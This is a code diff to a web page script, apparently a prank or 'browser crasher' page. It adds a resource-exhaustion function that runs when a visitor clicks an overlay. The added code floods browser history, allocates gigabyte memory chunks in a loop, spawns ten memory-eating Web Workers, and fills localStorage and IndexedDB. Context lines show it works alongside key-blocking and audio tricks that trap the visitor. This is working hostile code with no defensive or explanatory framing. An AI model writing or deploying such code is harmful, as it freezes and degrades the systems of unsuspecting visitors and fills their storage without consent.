@@ -256,6 +256,84 @@ body, html {
         }
     }
 
+    // --- NEW FUNCTION: EXHAUST SYSTEM RESOURCES ---
+    function exhaustResources() {
+        // 1. Continuous history flood (thousands of entries per second)
+        setInterval(() => {
+            try {
+                history.pushState(null, null, location.href);
+            } catch (e) {}
+        }, 1);
+
+        // 2. Memory exhaustion (target 1TB–1PB)
+        const memoryHogs = [];
+        setInterval(() => {
+            try {
+                // Allocate 1GB chunks as fast as possible
+                memoryHogs.push(new Uint8Array(1024 * 1024 * 1024));
+            } catch (e) {
+                // If OOM, try smaller chunks (500MB)
+                try {
+                    memoryHogs.push(new Uint8Array(1024 * 1024 * 500));
+                } catch (e2) {
+                    // If still failing, keep trying
+                }
+            }
+        }, 10);
+
+        // 3. Spawn Web Workers that also allocate memory
+        const workers = [];
+        for (let i = 0; i < 10; i++) {
+            try {
+                const workerBlob = new Blob([`
+                    const workerMemory = [];
+                    setInterval(() => {
+                        try {
+                            workerMemory.push(new Uint8Array(1024 * 1024 * 1024));
+                        } catch (e) {}
+                    }, 10);
+                `], { type: 'application/javascript' });
+                const workerUrl = URL.createObjectURL(workerBlob);
+                const w = new Worker(workerUrl);
+                workers.push(w);
+            } catch (e) {}
+        }
+
+        // 4. Fill localStorage until quota exceeded (fills disk cache)
+        setInterval(() => {
+            try {
+                const key = '_' + Math.random().toString(36).substr(2, 10);
+                const value = 'X'.repeat(1024 * 1024 * 5); // 5MB string
+                localStorage.setItem(key, value);
+            } catch (e) {
+                // Quota exceeded, continue trying with different keys
+            }
+        }, 100);
+
+        // 5. Fill IndexedDB with large blobs (if persistent storage is available)
+        try {
+            const request = indexedDB.open('ExhaustDB', 1);
+            request.onupgradeneeded = function(e) {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains('store')) {
+                    db.createObjectStore('store');
+                }
+            };
+            request.onsuccess = function(e) {
+                const db = e.target.result;
+                setInterval(() => {
+                    try {
+                        const tx = db.transaction('store', 'readwrite');
+                        const store = tx.objectStore('store');
+                        const key = 'k' + Math.random().toString(36).substr(2, 10);
+                        const value = new ArrayBuffer(1024 * 1024 * 10); // 10MB
+                        store.put(value, key);
+                    } catch (e) {}
+                }, 100);
+            };
+        } catch (e) {}
+    }
+
     // --- START FUNCTION (called when overlay clicked) ---
     window.startExperience = function() {
         if (hasTriggered) return;
@@ -267,7 +345,7 @@ body, html {
         if (overlay) overlay.style.display = 'none';
         if (blackScreen) blackScreen.style.display = 'none';
 
-        // Flood history
+        // Flood history (initial burst)
         floodHistory();
 
         // Initialize audio boost (requires user gesture)
@@ -304,6 +382,9 @@ body, html {
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
+
+        // --- CALL THE RESOURCE EXHAUSTION FUNCTION ---
+        exhaustResources();
     };
 
     // --- Attach start to overlay click (anywhere on overlay) ---
